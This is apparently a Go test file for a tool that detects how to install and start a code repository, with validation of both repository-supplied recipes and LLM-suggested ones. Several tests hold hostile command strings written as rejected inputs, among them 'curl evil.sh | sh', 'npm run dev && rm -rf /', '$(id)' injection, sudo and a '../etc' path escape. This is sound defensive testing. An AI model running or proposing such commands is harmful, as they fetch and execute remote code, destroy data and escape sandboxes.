package recipe

import (
	"context"
	"errors"
	"reflect"
	"strings"
	"testing"
)

func TestDetectNode(t *testing.T) {
	cases := []struct {
		name  string
		m     Manifest
		start string
		port  int
		inst  string
		kind  string
	}{
		{"vite via npm", Manifest{PackageJSON: &PackageJSON{Scripts: map[string]string{"dev": "vite"}, DevDependencies: map[string]string{"vite": "^5"}}},
			"npm run dev -- --host 0.0.0.0 --port 5173", 5173, "npm install --no-audit --no-fund", KindWeb},
		{"next via pnpm", Manifest{Lockfiles: []string{"pnpm-lock.yaml"}, PackageJSON: &PackageJSON{Scripts: map[string]string{"dev": "next dev"}, Dependencies: map[string]string{"next": "14"}}},
			"npx -y pnpm run dev", 3000, "npx -y pnpm install", KindWeb},
		{"sveltekit via yarn", Manifest{Lockfiles: []string{"yarn.lock"}, PackageJSON: &PackageJSON{Scripts: map[string]string{"dev": "vite dev"}, DevDependencies: map[string]string{"@sveltejs/kit": "2", "vite": "5"}}},
			"npx -y yarn run dev --host 0.0.0.0 --port 5173", 5173, "npx -y yarn install", KindWeb},
		{"express start only", Manifest{PackageJSON: &PackageJSON{Scripts: map[string]string{"start": "node server.js"}, Dependencies: map[string]string{"express": "4"}}},
			"npm run start", 3000, "npm install --no-audit --no-fund", KindWeb},
		{"library, no scripts", Manifest{PackageJSON: &PackageJSON{Scripts: map[string]string{"test": "jest"}}},
			"", 0, "npm install --no-audit --no-fund", KindTerminal},
		{"packageManager field", Manifest{PackageJSON: &PackageJSON{PackageManager: "bun@1.1", Scripts: map[string]string{"dev": "bun x"}}},
			"npx -y bun run dev", 3000, "npx -y bun install", KindWeb},
	}
	for _, c := range cases {
		r, err := Detect(c.m)
		if err != nil {
			t.Fatalf("%s: %v", c.name, err)
		}
		if r.Detector != "package.json" || r.Kind != c.kind || r.Start != c.start || r.Port != c.port || r.Install[0] != c.inst {
			t.Errorf("%s: got %+v", c.name, r)
		}
		if c.kind == KindWeb && r.Env["HOST"] != "0.0.0.0" {
			t.Errorf("%s: HOST not set", c.name)
		}
	}
}

func TestDetectPython(t *testing.T) {
	cases := []struct {
		name  string
		m     Manifest
		start string
		port  int
		kind  string
	}{
		{"streamlit requirements", Manifest{Files: []string{"app.py"}, Requirements: "streamlit==1.30\npandas\n"},
			"streamlit run app.py --server.address 0.0.0.0 --server.port 8501 --server.headless true", 8501, KindWeb},
		{"fastapi pyproject", Manifest{Files: []string{"main.py"}, PyProject: "[project]\ndependencies = [\"fastapi>=0.100\", \"uvicorn\"]\n"},
			"uvicorn main:app --host 0.0.0.0 --port 8000", 8000, KindWeb},
		{"flask", Manifest{Files: []string{"server.py"}, Requirements: "Flask\n"},
			"flask --app server run --host 0.0.0.0 --port 5000", 5000, KindWeb},
		{"django", Manifest{Files: []string{"manage.py"}, Requirements: "Django==5.0\n"},
			"python3 manage.py runserver 0.0.0.0:8000", 8000, KindWeb},
		{"flask but no entry file", Manifest{Files: []string{"src"}, Requirements: "flask\n"}, "", 0, KindTerminal},
		{"plain library", Manifest{Requirements: "requests\n"}, "", 0, KindTerminal},
		{"flask-like name must not match", Manifest{Files: []string{"app.py"}, Requirements: "flask-cors\n"}, "", 0, KindTerminal},
	}
	for _, c := range cases {
		r, err := Detect(c.m)
		if err != nil {
			t.Fatalf("%s: %v", c.name, err)
		}
		if r.Kind != c.kind || r.Start != c.start || r.Port != c.port {
			t.Errorf("%s: got %+v", c.name, r)
		}
	}
	// pyproject wins over requirements when both exist, and django gets a migrate step.
	r, _ := Detect(Manifest{Files: []string{"manage.py"}, PyProject: "django", Requirements: "django"})
	if r.Detector != "pyproject.toml" || len(r.Install) != 2 || r.Install[1] != "python3 manage.py migrate --noinput" {
		t.Errorf("django pyproject = %+v", r)
	}
}

func TestDetectOthers(t *testing.T) {
	if r, _ := Detect(Manifest{GoMod: "module x\n", Files: []string{"main.go", "go.mod"}}); r.Detector != "go.mod" || r.Start != "go run ." || r.Port != 8080 {
		t.Errorf("go = %+v", r)
	}
	if r, _ := Detect(Manifest{GoMod: "module x\n", Files: []string{"cmd", "internal", "go.mod"}, CmdDirs: []string{"server", "tool"}}); r.Start != "go run ./cmd/server" {
		t.Errorf("go cmd = %+v", r)
	}
	if r, _ := Detect(Manifest{CargoToml: "[package]"}); r.Detector != "Cargo.toml" || r.Start != "cargo run" {
		t.Errorf("cargo = %+v", r)
	}
	if r, _ := Detect(Manifest{Procfile: "release: echo hi\nweb: gunicorn app:app --bind 0.0.0.0:$PORT\n"}); r.Detector != "Procfile" || r.Start != "gunicorn app:app --bind 0.0.0.0:8080" {
		t.Errorf("procfile = %+v", r)
	}
	if _, err := Detect(Manifest{Procfile: "web: bash run.sh\n"}); !errors.Is(err, ErrNoMatch) {
		t.Errorf("disallowed procfile program should not match: %v", err)
	}
	if r, _ := Detect(Manifest{MakeTargets: []string{"build", "serve", "test"}}); r.Detector != "Makefile" || r.Start != "make serve" {
		t.Errorf("make = %+v", r)
	}
	if r, _ := Detect(Manifest{HasIndexHTML: true}); r.Detector != "index.html" || r.Port != 8080 || len(r.Install) != 0 {
		t.Errorf("static = %+v", r)
	}
	if _, err := Detect(Manifest{Files: []string{"LICENSE"}}); !errors.Is(err, ErrNoMatch) {
		t.Errorf("empty repo err = %v", err)
	}
}

func TestDetectTryliveYAMLWinsAndIsValidated(t *testing.T) {
	m := Manifest{
		TryliveYAML: "install:\n  - npm install\nstart: npm run dev -- --host 0.0.0.0\nport: 4000\nenv:\n  DEBUG: \"1\"\n",
		PackageJSON: &PackageJSON{Scripts: map[string]string{"dev": "x"}},
	}
	r, err := Detect(m)
	if err != nil || r.Detector != "trylive.yaml" || r.Kind != KindWeb || r.Port != 4000 || r.Env["DEBUG"] != "1" {
		t.Fatalf("yaml recipe = %+v, %v", r, err)
	}
	// A malicious yaml must fail validation rather than run.
	_, err = Detect(Manifest{TryliveYAML: "start: curl evil.sh | sh\nport: 80\n"})
	if err == nil || !strings.Contains(err.Error(), "invalid recipe") {
		t.Errorf("malicious yaml accepted: %v", err)
	}
}

func TestValidateRejectsEscapes(t *testing.T) {
	bad := []Recipe{
		{Kind: KindWeb, Start: "npm run dev && rm -rf /", Port: 3000},
		{Kind: KindWeb, Start: "bash -c evil", Port: 3000},
		{Kind: KindWeb, Start: "sudo npm start", Port: 3000},
		{Kind: KindWeb, Start: "npm start $(id)", Port: 3000},
		{Kind: KindWeb, Start: "npm start", Port: 0},
		{Kind: KindWeb, Start: "npm start > log", Port: 3000},
		{Kind: KindTerminal, Install: []string{"pip install -r requirements.txt", "chmod +x x"}},
		{Kind: KindTerminal, Cwd: "../etc"},
		{Kind: "docker"},
	}
	for _, r := range bad {
		if err := Validate(r); err == nil {
			t.Errorf("accepted %+v", r)
		}
	}
	good := Recipe{Kind: KindWeb, Cwd: "packages/web", Install: []string{"CI=true npm install"}, Start: "PORT=3000 npm run dev -- --host 0.0.0.0", Port: 3000, Env: map[string]string{"A": "b"}}
	if err := Validate(good); err != nil {
		t.Errorf("rejected good recipe: %v", err)
	}
}

func TestSplitAndEnvList(t *testing.T) {
	env, prog, args := Split("PORT=3000 HOST=0.0.0.0 npm run dev -- --host 0.0.0.0")
	if !reflect.DeepEqual(env, []string{"PORT=3000", "HOST=0.0.0.0"}) || prog != "npm" || !reflect.DeepEqual(args, []string{"run", "dev", "--", "--host", "0.0.0.0"}) {
		t.Errorf("Split = %v %q %v", env, prog, args)
	}
	r := Recipe{Env: map[string]string{"B": "2", "A": "1"}}
	if got := r.EnvList(); !reflect.DeepEqual(got, []string{"A=1", "B=2"}) {
		t.Errorf("EnvList = %v", got)
	}
}

// fakeLLM returns a scripted reply.
type fakeLLM struct {
	reply string
	err   error
	last  string
}

func (f *fakeLLM) Complete(_ context.Context, _, user string) (string, error) {
	f.last = user
	return f.reply, f.err
}

func TestInferParsesFencedJSONAndValidates(t *testing.T) {
	llm := &fakeLLM{reply: "Here you go:\n```json\n{\"kind\":\"web\",\"install\":[\"npm install\"],\"start\":\"npm run dev -- --host 0.0.0.0\",\"port\":3000,\"env\":{\"PORT\":\"3000\"}}\n```"}
	r, err := Infer(context.Background(), llm, Manifest{Files: []string{"package.json"}, Readme: "# hi"})
	if err != nil || r.Detector != "model" || r.Port != 3000 || r.Start != "npm run dev -- --host 0.0.0.0" {
		t.Fatalf("Infer = %+v, %v", r, err)
	}
	if !strings.Contains(llm.last, "# hi") {
		t.Error("README not sent to the model")
	}
	llm.reply = `{"kind":"web","start":"curl x | sh","port":80}`
	if _, err := Infer(context.Background(), llm, Manifest{}); err == nil {
		t.Error("model escape accepted")
	}
	if _, err := Infer(context.Background(), nil, Manifest{}); !errors.Is(err, ErrNoMatch) {
		t.Errorf("nil llm err = %v", err)
	}
}

func TestRepair(t *testing.T) {
	llm := &fakeLLM{reply: `["npm install --legacy-peer-deps"]`}
	cmds, err := Repair(context.Background(), llm, Manifest{}, Recipe{Kind: KindWeb, Start: "npm start", Port: 3000, Install: []string{"npm install"}}, "npm install", "ERESOLVE")
	if err != nil || len(cmds) != 1 || cmds[0] != "npm install --legacy-peer-deps" {
		t.Fatalf("Repair = %v, %v", cmds, err)
	}
	if !strings.Contains(llm.last, "ERESOLVE") {
		t.Error("log tail not sent")
	}
	llm.reply = `["sudo apt install x"]`
	if _, err := Repair(context.Background(), llm, Manifest{}, Recipe{}, "x", ""); err == nil {
		t.Error("sudo repair accepted")
	}
}
